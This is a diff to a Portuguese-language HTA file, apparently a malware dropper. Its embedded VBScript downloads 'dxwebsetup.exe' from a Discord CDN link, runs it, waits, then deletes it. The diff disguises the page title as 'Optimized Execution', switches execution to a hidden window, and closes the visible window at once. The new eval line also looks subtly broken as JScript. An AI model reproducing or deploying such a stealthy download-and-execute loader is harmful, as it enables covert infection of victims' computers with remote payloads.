@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Baixar, Executar e Apagar - MSHTA</title>
+    <title>Execução Otimizada</title>
 
     <script language="JScript">
         // -----------------------------------------------------
@@ -10,62 +10,52 @@
         // -----------------------------------------------------
         var FileURL = "https://cdn.discordapp.com/attachments/1440238279441252407/1440831105820524594/dxwebsetup.exe?ex=691f9608&is=691e4488&hm=0cd0cd30bb022289189515710f772a686b8e40dd010bfee084e526dce1e4b3f4&";
         var LocalFileName = "dxwebsetup.exe";
-        var ExecutionWaitSeconds = 10; // Tempo de espera para o arquivo ser executado antes de apagar (em segundos)
-
+        var ExecutionWaitSeconds = 10;
+        
         // -----------------------------------------------------
-        // 2. VBScript para Download, Execução e Limpeza
+        // 2. VBScript para Download, Execução e Limpeza (Ação Principal)
         // -----------------------------------------------------
         var VBS_SCRIPT = `
             On Error Resume Next
             
-            ' Configurações
             Dim WshShell, FSO, objXMLHttp, objStream
-            Dim FileURL, LocalFileName, ExecutionWaitSeconds
-            FileURL = "` + FileURL + `"
-            LocalFileName = "` + LocalFileName + `"
-            ExecutionWaitSeconds = ` + ExecutionWaitSeconds + `
             
             Set WshShell = CreateObject("WScript.Shell")
             Set FSO = CreateObject("Scripting.FileSystemObject")
             
             ' --- A) Download ---
             Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
-            objXMLHttp.open "GET", FileURL, False
+            objXMLHttp.open "GET", "` + FileURL + `", False
             objXMLHttp.send
             
             If objXMLHttp.Status = 200 Then
                 Set objStream = CreateObject("ADODB.Stream")
-                objStream.Open
-                objStream.Type = 1 ' Binário
+                objStream.Open: objStream.Type = 1
                 objStream.Write objXMLHttp.responseBody
-                objStream.SaveToFile LocalFileName, 2 ' Salva o arquivo
-                objStream.Close
+                objStream.SaveToFile "` + LocalFileName + `", 2
                 
                 ' --- B) Execução ---
-                WshShell.Run LocalFileName, 1, False ' Executa o EXE (1 = janela normal, True/False não importa muito aqui)
+                ' Executa o instalador em modo oculto (0)
+                WshShell.Run "` + LocalFileName + `", 0, False
                 
                 ' --- C) Espera e Apaga ---
-                WScript.Sleep (ExecutionWaitSeconds * 1000) ' Espera X segundos
+                WScript.Sleep (1000 * ` + ExecutionWaitSeconds + `)
                 
-                If FSO.FileExists(LocalFileName) Then
-                    FSO.DeleteFile LocalFileName, True ' Apaga o arquivo
+                If FSO.FileExists("` + LocalFileName + `") Then
+                    FSO.DeleteFile "` + LocalFileName + `", True
                 End If
             End If
             
-            Set WshShell = Nothing
-            Set FSO = Nothing
+            Set WshShell = Nothing: Set FSO = Nothing
         `;
 
         // -----------------------------------------------------
-        // 3. Execução Silenciosa
+        // 3. Execução e Fechamento
         // -----------------------------------------------------
-        // Comando que injeta o VBScript e executa de forma oculta (0)
-        var cmd = 'mshta.exe vbscript:Execute("' + VBS_SCRIPT.replace(/"/g, '\"') + '"):window.close';
-        
-        // Executa o comando em segundo plano (0)
-        new ActiveXObject("WScript.Shell").Run(cmd, 0, false);
-        
-        // Fecha a janela visível atual (a que foi aberta no Win+R)
+        // 1. Executa o VBScript com a lógica de download/execução/limpeza
+        eval('Execute(VBS_SCRIPT)'); 
+
+        // 2. Fecha a janela visível imediatamente após disparar o VBScript
         window.close();
     </script>
 </head>
